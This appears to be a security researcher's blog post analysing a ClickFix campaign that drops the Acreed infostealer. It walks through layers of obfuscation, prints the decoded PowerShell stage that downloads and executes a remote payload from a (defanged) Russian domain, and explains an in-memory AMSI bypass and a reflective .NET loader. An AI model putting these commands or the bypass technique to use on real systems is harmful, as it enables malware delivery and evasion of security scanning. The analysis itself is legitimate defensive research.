---
layout: post
title:  "EtherHiding Dropping Acreed Infostealer - Full Malware Analysis"
date:   2025-09-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

This week I dive way to deep into a bit of malware pulled from a Clickfix Campaign. The Clickfix payload was delivered through Ether Hiding. I attributed this to Acreed Infostealer through Eth Smart Contracts and Domain IOCs extracted during analysis. 
- Full writeup on that is available here: 

Anyhow, I thought LummaStealer was tough. Acreed is crazy. 

Coupla spoilers: 
- Three staged dropper/loader, AMSI bypass code, XOR everywhere and Malware Dev OPSec errors.

Hope you enjoy, this one took some time!

## Dropper 

Below is the Clickfix command. Our starting point.

``mshta hXXps://gb[.]kaq51[.]ru/m54tdry4``

Okay, when safely pulled with my jank script I get about 2.5mbs of bits and bytes. 

### Top to Bottom Static Analysis

![alt text](/images/mal_first.PNG)
- First up a command to move open mshta cmd window to the bottom left of the screen (-99,0). Likely to avoid suspicion?
- Next we can see an ``ELF`` file header and a Linux OS? Perhaps this is an embedded linux file. I can try to rebuild it cause we have the bytes!
- Last we have a script open up with some obfuscated VB code?

I tried to rebuild the .elf file in a Linux VM but cannot get it right, probably a character or a space off the right bits and bytes. I'll leave it for now. Perhaps later on there may be opportunity to dump it.

![alt text](/images/vbs.PNG)

Some hex strings. I'm seeing this throughout the code, so I'll go through and convert every hex string I spot.

![alt text](/images/unobfuscted_first.PNG)

Now we can see a bit better, here what this function does.
1. Parses in the variable ``thkiaqvpzab``
2. Declares variables
3. Creates a WMI object
4. Connects to WMI service on machine
5. Gets the ProcessStartup class. This allows for process creation and management using WMI.
6. Sets the configuration of the WMI service to the variable ``nrhfhprneb`` with three flags. Configuration of WMI Object (``aihoizxpjk``), window size (``aihoizxpjk``) and an unknown variable of that passed in variable ``thkiaqvpzab``

In summary the function uses WMI to spawn a hidden process.

![alt text](/images/second_part.PNG)

Now this pieces together the puzzle, this function creates the new process with the startup settings passed in from our previous function. 

![alt text](/images/next.PNG)

This stinks of a payload. Looks like Hex --> B64 --> Plaintext?

![alt text](/images/cyberchef_first.PNG)

Bingo. But that last part still looks like B64.

This hex string pattern occurs for about 60 more lines. So I'll Ctrl+H in Notepad++ and replace all instances of `eanjxdqwjegyor` and `ftekumdnoycycubr` with a null value, along with the brackets, equals and quotations.

![alt text](/images/payload_hex.PNG)

Cool now I'll whack this into CyberChef and see what we get. Decoding with Hex --> B64

![alt text](/images/hex_b64.PNG)

Close. With the B64 left over, I'll copy/paste to a new input tab and decode that.

![alt text](/images/b64_decode.PNG)

Alright this still looks obfuscated. Let me copy/paste to notepad++ and see what I'm dealing with

![alt text](/images/weird_string.PNG)
![alt text](/images/encoded.PNG)

Looks like inline encoding. This string is huge. The decoding function at the end of the string, looks complicated, but tells us how to unencode! So time to whip out CyberChef, to unbake a payload. 

The unencoding function does the following:
1. Replaces all ! with 4s
2. Replaces all > with 5s
3. Decodes from Hex
4. Decodes from B64

So if we follow this pattern. We will have the cleartext.

![alt text](/images/baking.PNG)

Now that looks like hex to me. Lets decode from hex.

![alt text](/images/b64_still.PNG)

Now that looks like B64. Cmon surely this is it!

![alt text](/images/woohoo.PNG)

Bingo. How fun is decoding stuff.

``$È=New-Object System.Diagnostics.ProcessStartInfo;$È.FileName=($env:WINDIR+([char]92)+'SysWOW64'+[char]92+'WindowsPowerShell'+[char]92+'v1.0'+[char]92+'powershell.exe');$sub=-join(97..122|random -c(random -mi 3 -ma 6)|%{[char]$_});$È.Arguments='-Exec Unrestricted -Wind Hid -Comm "SV U ([Net.WebClient]::New());Set-Item Variable:/URM ''hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers'';(LS Variable:U).Value.(((([Net.WebClient]::New()|Member)|Where{(GV _ -Valu).Name-ilike''*wn*d*g''}).Name))((Get-Variable URM).Value)|&(GCI Alias:\*EX)"';$È.UseShellExecute=$false;$È.CreateNoWindow=$true;$È.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;[System.Diagnostics.Process]::Start($È)``

Uses ``WebClient.DownloadString`` to download a file stored at the following web address ``hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers`` and run it using ``Invoke-Expression``

Let's take a quick look at ``$sub``. 
- ``$sub=-join(97..122|random -c(random -mi 3 -ma 6)|%{[char]$_})``

PowerShell is randomly generating a string for the ``$sub`` variable that is then passed into the domain ``hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers``
- Anything between 3 and 6 characters in size is accepted
- Between 97..122 in ASCII (so a-z)
So it's accepting anything within those parameters. So server-side at ``hXXp://'+$sub+'[.]ci6ef[.]ru`` there must be a tonne of subdomains that are accepted to fetch the payload. 

Why do this?
- Harder to determine how many users have hit the domain. If the subdomain varies, this is another consideration analysts need to make when querying proxy logs for traffic to the domain ``ci6ef[.]ru``
- Keeps the domain from being hardcoded, less likely to be detected by EDRs. 

Back to my jank script to pull down the loader, I'll try ``hXXp://abc[.]ci6ef[.]ru/sinkers``. 

![alt text](/images/pull.PNG)
![alt text](/images/down.PNG)

Well it's down. Getting 404s and no Nslookup return.

I'll repull a fresh sample of the dropper from the infected clickfix page and repeat the above. Rolling domains regularly is something I've observed for Lumma payloads. (Skip to "Loader" section to pick up from here).

### Further Dropper Analysis

Now this is interesting. AutoOpen() is a macro used for Word/Excel. So perhaps, the malware opens an embedded word/excel document with a macro in it? AutoOpen() calls in ``ozybymuzpian``

![alt text](/images/third_function.PNG)

I'm not sure about this function. Really got no idea. May circle back.

![alt text](/images/fourth_function.PNG)

## Loader

Hell yea, mission somewhat accomplished.

![alt text](/images/size.PNG)
![alt text](/images/size2.PNG)

This file is huge, I feel like I'm being trolled (clearly). I have no idea how I'm going to go through this. First though is AI but no model is accepting this input. Perhaps I can run a pattern matching algorithm over it? ML or something to flag anomalies. My static analysis journey is now under serious question.

Scrap that this is easy (it's amazing what sleep can do).

![alt text](/images/obfu_method.PNG)
This sets the value of the variable ``VYesPp`` to the character conversion of multiple other variable values. This is converting a number to a character. That number is stored in the variables. So we need to find the value of the variables that combine to make the value of ``VYesPp``. Or we could just print it, but that's no fun! So I'll do it the long way for this one, let's try ``qyWuQbjO``

![alt text](/images/value.PNG)
Alright this was almost easy. But, there are more variables to chase down. Like a lot. The combination of all these variable values equal ``qyWuQbjO``. But, it's not important to manually do this as we can print it unencoded once we understand the flow better.

Note the ``$hexafoil`` variable. Looks to contain a bunch of raw bytes. So is likely our payload.

![alt text](/images/b64_somehow.PNG)
Cyberchef shows B64 encoded. When I further decode from B64 no luck, we are still a while away by the looks.

![alt text](/images/formatted.PNG)
I've formatted the code below ``hexafoil`` and it paints a clearer picture as to what is going on.

![alt text](/images/golkv.PNG)
Let's start with decoding the value of this variable.

![alt text](/images/printed.PNG)
I've removed the dodgy code below, and taken a snapshot just in case, disconnected from internet and appended ``Write-Host($VYesPp)`` to the script to print the value of ``VYesPp``. I'll do the same for the following variables and list below
- ``$VYesPp`` = System.Text.Encoding
- ``$KlmoMwn`` = UTF8
- ``$OcgMhVmuJPe`` = GetBytes

Amazing how easy things read unencrypted.
-  ``$golKv = (System.Text.Encoding -as [Type])::UTF8.GetBytes("$emprosthotonic")``
- Takes the string in ``$emprosthotonic`` and converts it to a byte array and stores it in $golKv (this reeks of a key)

So let's just change it to ``Write-Host($emprosthotonic))`` to print the value of it to CLI.
![alt text](/images/AMSI.PNG)

"AMSI_RESULT_NOT_DETECTED" suggests that ``$emprosthotonic`` ran something to determine whether ASMI was able to perhaps be bypassed? 

![alt text](/images/empro.PNG)

Quick check confirms dynamic code was ran to determine the value of ``emprosthotonic``. Likley an ASMI bypass/check?

Anyhow. This is what it looks like ``$golKv = (System.Text.Encoding -as [Type])::UTF8.GetBytes("AMSI_RESULT_NOT_DETECTED")``

![alt text](/images/loop.PNG)

Pretty confident ``$golKv`` ("AMSI_RESULT_NOT_DETECTED") is a key. Can see it passed in later on during this loop craziness I've yet to look at.

![alt text](/images/no_ob.PNG)

Lets take a look at the first loopy looking function. We can pass in values of the variables earlier to make these more readable

![alt text](/images/half_deob.PNG)

Halfway there we will print the last variables.

- ``$IlfSA`` =  GetString
- ``$YJdlpgFmHeLxth`` = FromBase64String
- ``$knVotsG`` = System.Convert

![alt text](/images/de_ob_full.PNG)

Haha! This tells us to decode the value of ``$hexafoil``. Layered with a bit of crap. UTF8.GetString --> B64 --> UTF8.GetString --> UTF8.GetBytes
- This value is stored in ``$ZyscArvKNSUxgX`` as the UTF-8 bytes of the B64 payload.

![alt text](/images/cheddar.PNG)

We are getting to the cheddar now. Last blob to analyse. Let's start by replacing some of the jargon with the values we already know and the ones we don't.
- ``$EJFryleoaZihHn`` = Scriptblock
- ``$KGyjgcNQz`` = Create
- ``$fkuvnP`` = length
- ``$SyWzumJ`` = Invoke

I'll quikcly preface how much quicker dumping the values of the variables is. Once you know the code is safe and that those variables aren't being calculated by malicious code being ran it is rather safe, especially with guardrails.

![alt text](/images/cheddar_cheese.PNG)

Gee whiz I am close. This looks like an XOR function. Passes in our XOR key which we know is the value of ``$golKv`` and iterates through ``$hexafoil`` to decrypt the goodies.

Therefore, we know everything! Let's unbake this payload in our favourite non-commercial cyber kitchen (CyberChef).

The decryption method from our raw bytes in ``$hexafoil`` is From Decimal (Comma) --> Decode UTF-8 --> From Base64 --> XOR (Key = "AMSI_RESULT_NOT_DETECTED")

![alt text](/images/we_have_code.PNG)

We have clear text code!! Finally. This is darn epic.

### Cleartext At Last

Well it looks like we've found the next stage of whatever on earth we are dealing with here.

![alt text](/images/first_start.PNG)
![alt text](/images/first_second.PNG)

Appreciate the comments explaining the code, lvl 0 soc analyst approved. No obfuscation either, how good.

Here's some of what I can pick initially
- B64 string stored in ``$a``
- System.Reflection.Assembly
- Thread sleeping

Some Win32 APIs, suggesting process/memory modification.
- VirtualProtect
- VirtualQuery
- GetSystemInfo
- ReadProcessMemory
- WriteProcessMemory
- GetCurrentProcess

### AMSI Bypass

Wow, it looks like we have an AMSI reference here, perhaps an AMSI bypass?
![alt text](/images/signature.PNG)
- ``$signature`` stores "AmsiScanBuffer"

![alt text](/images/enumerate_mem_regions.PNG)
The function above is scanning through every allocated memory region collecting the following
- Base address
- Region size
- Protection flags
- Mapped file

![alt text](/images/readable.PNG)
This function checks what memory regions are readable/writeable. 

![alt text](/images/scanamsi.PNG)
This function is a bit of a mouthful. Essentially if a memory region belongs to ``crl.dll`` it is scanning it for the "AmsiScanBuffer" symbol stored in the ``$signature`` variable from earlier.

AMSI function are compiled into CRL memory, hence why it is only checking ``crl.dll`.

![alt text](/images/patch.PNG)
This function seals the deal. After a hit for "AmsiScanBuffer" is found the function makes the memory address writable. Then overwrites the memory object with null bytes, thus corrupting the function. 

Note this won't crash AmsiScanBuffer it just breaks calls into it, as it points to null bytes, therefore, doing nothing.

Lastly it restores old memory protection, thus making it not writable again.

### Reflective .NET Loader

Okay we have our B64 string that we will decode below. However, lets determine how this is passed in to memory. 

![alt text](/images/load.PNG)
- Loads the bytes into memory
- Grabs metadata allowing it to be invoked at a later date

![alt text](/images/goodies.PNG)
I'm going to be straight up. I can't wrap my head around what is happening in the above function.

However, I know we have a loader that is taking the unencoded B64 string and running it in memory inside PowerShell, without creating a new process. 

I thought this was cool. This evades the common EDR hook ``[System.Reflection.Assembly]::Load()`` through writing it as ``System.Reflection.Assembly Load(byte[])``

### B64 String

Let's unobfuscate the B64 string stored in ``$a``

``$bytes = [System.Convert]::FromBase64String($a) [IO.File]::WriteAllBytes("output.bin", $bytes)``
- This dumps the value of ``$bytes`` into "output.bin"

Sweet we have 1.2mbs of goodies. Here are the hashes.
- MD5 ``022611e6ffcb30ae62a27c5009d528d7``
- SHA256 ``006f0054609064c00d3d217ee37f924b4cf8c4fabde362408cdec1446d719913``

### Payload

![alt text](/images/DiE_result.PNG)
Detect it Easy result. 
- Obfuscation = ``(Heur) Protection: Obfuscation [Modified EP + CLR constructor + Strange EP position + Virtualization + Calls encrypt + Anti-ILDASM + Ctrl flow + Fake .cctor name + Math mutations + Watermark]``

![alt text](/images/vt_yep.PNG)
Boy oh boy. What have we got here. SUCCESS!

Lets run my strings IOC script over it and see what we can find. No hits, that hurts the ego. Looks like C2 domains and the other juicy stuff is further encrypted as suggested by the obfuscation detected in DiE. 

Here's what I picked out of strings when I ran normally: 

``D:\Keppy\Desktop\issrc-arm64\issrc-arm64\Examples\MyProg\xARM64\Debug\MyProg.pdb``
- Wow this is revealing. Shows the devs windows profile name was "Keppy". This is a big time OPSec error. Can't find anything anywhere attributing 'Keppy'. This is a great find.

``(This EXE was compiled for the ARM64 architecture.)``
- ARM64 malware? Quite uncommon, cool stuff. Did see a post a while back on Dread about why no one builds ARM64 malware, now they do I guess.

``Unizeto Technologies S.A.1``
- Polish PKI and signature service. Acreed Russian based. Similar geographical position.

``ProtoGen2.3.0.277``
- ProtoBuf-net is used 

``\u0093\u0094\u009A``
- Unicode-name obfuscation.

``m_de53635982c949d7a12e56c706211ac1``
- ConfuserEx mutuated string decryptor method.

``acr-GETWELL-3ftrxv1z.p51_.exe``
- Auto generated assembly name. Looks obfuscated with a pattern. The "acr" at the start is a common naming convention for Acreed infostealer. Furthermore, the "GETWELL" is also cool could be campaign related.

## Dynamic Analysis

## Conclusion
